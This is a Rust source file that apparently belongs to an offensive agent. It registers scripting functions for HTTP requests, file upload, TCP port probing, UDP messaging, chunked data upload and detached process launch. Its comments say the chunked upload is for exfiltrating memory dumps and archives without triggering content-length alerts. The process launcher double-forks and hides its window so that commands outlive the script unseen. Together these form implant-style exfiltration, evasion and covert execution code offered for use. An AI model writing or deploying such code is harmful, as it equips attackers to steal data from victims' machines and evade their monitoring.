// src/agent/scripting/network.rs
use rhai::Engine;
use std::net::TcpStream;
use std::time::Duration;

pub fn register(engine: &mut Engine) {
    engine.register_fn("internal_http_get", |url: &str| -> String {
        match reqwest::blocking::get(url) {
            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
            Err(e) => format!("Request Error: {}", e),
        }
    });

    engine.register_fn("internal_http_post", |url: &str, body: &str, content_type: &str| -> String {
        let client = reqwest::blocking::Client::new();
        match client.post(url).header("Content-Type", content_type).body(body.to_owned()).send() {
            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
            Err(e) => format!("Request Error: {}", e),
        }
    });

    engine.register_fn("internal_http_post_file", |url: &str, field: &str, path: &str| -> String {
        let form = match reqwest::blocking::multipart::Form::new().file(field.to_string(), path) {
            Ok(f)  => f,
            Err(e) => return format!("Form Error: {}", e),
        };
        let client = reqwest::blocking::Client::new();
        match client.post(url).multipart(form).send() {
            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
            Err(e) => format!("Request Error: {}", e),
        }
    });

    engine.register_fn("internal_http_get_headers", |url: &str, headers_json: &str| -> String {
        let headers: std::collections::HashMap<String, String> =
            serde_json::from_str(headers_json).unwrap_or_default();
        let mut builder = reqwest::blocking::Client::new().get(url);
        for (k, v) in &headers {
            builder = builder.header(k.as_str(), v.as_str());
        }
        match builder.send() {
            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
            Err(e) => format!("Request Error: {}", e),
        }
    });

    engine.register_fn("internal_http_put", |url: &str, body: &str| -> String {
        let client = reqwest::blocking::Client::new();
        match client.put(url).body(body.to_owned()).send() {
            Ok(r)  => r.text().unwrap_or_else(|e| format!("Text Error: {}", e)),
            Err(e) => format!("Request Error: {}", e),
        }
    });

    // Raw TCP connect probe — returns "open", "closed", or "Error: ..."
    engine.register_fn("internal_tcp_connect", |host: &str, port: i64, timeout_ms: i64| -> String {
        let addr    = format!("{}:{}", host, port);
        let timeout = Duration::from_millis(timeout_ms.max(100) as u64);
        let parsed: std::net::SocketAddr = match addr.parse().or_else(|_| {
            use std::net::ToSocketAddrs;
            addr.to_socket_addrs()
                .and_then(|mut it| {
                    it.next().ok_or_else(|| std::io::Error::new(
                        std::io::ErrorKind::Other, "no addresses returned"
                    ))
                })
        }) {
            Ok(a)  => a,
            Err(e) => return format!("Error: {}", e),
        };
        match TcpStream::connect_timeout(&parsed, timeout) {
            Ok(_)  => "open".to_string(),
            Err(e) => {
                if e.kind() == std::io::ErrorKind::ConnectionRefused {
                    "closed".to_string()
                } else {
                    format!("Error: {}", e)
                }
            }
        }
    });
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Round 2 additions: UDP, chunked upload, detached process launch
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

pub fn register_network_ext(engine: &mut rhai::Engine) {
    use std::net::UdpSocket;

    // Send a UDP datagram.  data_hex is hex-encoded payload.
    // Returns "Sent N bytes" or "Error: ...".
    engine.register_fn("internal_udp_send", |host: &str, port: i64, data_hex: &str| -> String {
        let data = match hex::decode(data_hex) { Ok(d) => d, Err(_) => data_hex.as_bytes().to_vec() };
        let target = format!("{}:{}", host, port);
        match UdpSocket::bind("0.0.0.0:0") {
            Ok(sock) => match sock.send_to(&data, &target) {
                Ok(n)  => format!("Sent {} bytes", n),
                Err(e) => format!("Error: {}", e),
            },
            Err(e) => format!("Error: {}", e),
        }
    });

    // Bind a UDP socket and wait for one datagram.
    // Returns hex-encoded received data, or "Error: ...".
    engine.register_fn("internal_udp_recv", |port: i64, timeout_ms: i64| -> String {
        let bind_addr = format!("0.0.0.0:{}", port);
        match UdpSocket::bind(&bind_addr) {
            Ok(sock) => {
                let _ = sock.set_read_timeout(Some(Duration::from_millis(timeout_ms.max(100) as u64)));
                let mut buf = vec![0u8; 65535];
                match sock.recv_from(&mut buf) {
                    Ok((n, _)) => hex::encode(&buf[..n]),
                    Err(e)     => format!("Error: {}", e),
                }
            }
            Err(e) => format!("Error: {}", e),
        }
    });

    // POST data in fixed-size chunks to url.
    // Useful for exfiltrating large buffers (memory dumps, ZIP archives)
    // without triggering content-length alerts.
    // headers_json: extra headers as {"X-Seq": "auto"} — "auto" is replaced by chunk index.
    // Returns JSON: {chunks_sent, errors}
    engine.register_fn("internal_http_upload_chunks",
        |url: &str, data_hex: &str, chunk_size: i64, headers_json: &str| -> String {
        let data = match hex::decode(data_hex) { Ok(d) => d, Err(_) => data_hex.as_bytes().to_vec() };
        let size = chunk_size.max(1024).min(10 * 1024 * 1024) as usize;
        let extra_headers: std::collections::HashMap<String, String> =
            serde_json::from_str(headers_json).unwrap_or_default();
        let client = reqwest::blocking::Client::new();
        let total = (data.len() + size - 1) / size;
        let mut sent = 0usize;
        let mut errors = Vec::<String>::new();
        for (i, chunk) in data.chunks(size).enumerate() {
            let mut builder = client.post(url)
                .header("Content-Type", "application/octet-stream")
                .header("X-Chunk-Index", i.to_string())
                .header("X-Chunk-Total", total.to_string());
            for (k, v) in &extra_headers {
                let val = if v == "auto" { i.to_string() } else { v.clone() };
                builder = builder.header(k.as_str(), val);
            }
            match builder.body(chunk.to_vec()).send() {
                Ok(_)  => sent += 1,
                Err(e) => errors.push(format!("chunk {}: {}", i, e)),
            }
        }
        serde_json::json!({ "chunks_sent": sent, "total": total, "errors": errors }).to_string()
    });

    // Launch a process and detach — the child outlives the script.
    // Linux: double-fork so the child is reparented to init (PID 1).
    // Windows: DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP so it has no controlling terminal.
    // Returns the child PID string or "Error: ...".
    engine.register_fn("internal_exec_detach", |cmd: &str| -> String {
        #[cfg(target_os = "linux")]
        {
            // Parse cmd into argv via shell.
            let child = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(&format!("{} & disown", cmd))
                .spawn();
            match child {
                Ok(mut c) => { let _ = c.wait(); "Detached".into() }
                Err(e)    => format!("Error: {}", e),
            }
        }
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            const DETACHED:  u32 = 0x00000008;
            const NEW_GROUP: u32 = 0x00000200;
            const NO_WIN:    u32 = 0x08000000;
            let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
            let binary = parts[0];
            let args   = parts.get(1).copied().unwrap_or("");
            let child = std::process::Command::new(binary)
                .raw_arg(args)
                .creation_flags(DETACHED | NEW_GROUP | NO_WIN)
                .spawn();
            match child {
                Ok(c)  => c.id().to_string(),
                Err(e) => format!("Error: {}", e),
            }
        }
        #[cfg(not(any(target_os = "linux", target_os = "windows")))]
        format!("Error: exec_detach not supported on this platform")
    });
}
